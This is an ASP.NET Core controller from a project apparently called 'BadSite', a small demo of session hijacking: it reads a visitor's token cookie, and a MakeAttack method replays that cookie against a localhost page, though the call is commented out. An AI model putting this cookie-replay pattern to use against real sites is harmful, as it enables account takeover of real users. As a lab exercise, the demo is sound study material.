using System.Diagnostics;
using System.Net;
using System.Text;
using System.Web;
using Microsoft.AspNetCore.Mvc;
using BadSite.Models;
using Microsoft.AspNetCore.WebUtilities;

namespace BadSite.Controllers;

public class HomeController : Controller
{
    private readonly ILogger<HomeController> _logger;

    public HomeController(ILogger<HomeController> logger)
    {
        _logger = logger;
    }

    private async Task<string?> MakeAttack(string cookie)
    {
        var handler = new HttpClientHandler();
        var cook = new CookieContainer();

        handler.CookieContainer = cook;
        using var client = new HttpClient(handler);

        var stealingCookie = new Cookie("token", cookie);
        
        cook.Add(new Uri("https://localhost:7133/Home/Privacy"), stealingCookie);

        var resp = await client.GetAsync("https://localhost:7133/Home/Privacy");

        if (resp.IsSuccessStatusCode)
        {
            Console.WriteLine("Ok");
            var content = await resp.Content.ReadAsStringAsync();

            return content;
        }
        else
        {
            Console.WriteLine("Error");
            Console.WriteLine("status code: " + resp.StatusCode);
        }
        return null;
    }

    public async Task<IActionResult> Index()
    {
        var cookie = Request.Cookies["token"];
        if (string.IsNullOrEmpty(cookie))
        {
            return NotFound();
        }

        // var result = await MakeAttack(cookie);
        // var web = WebEncoders.Base64UrlDecode(result.Substring(1, result.Length-2));
        // var enc = Encoding.UTF8.GetString(web);
        // Console.WriteLine(enc);
        return View();
    }

    public IActionResult Privacy()
    {
        return View();
    }

    [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
    public IActionResult Error()
    {
        return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
    }
}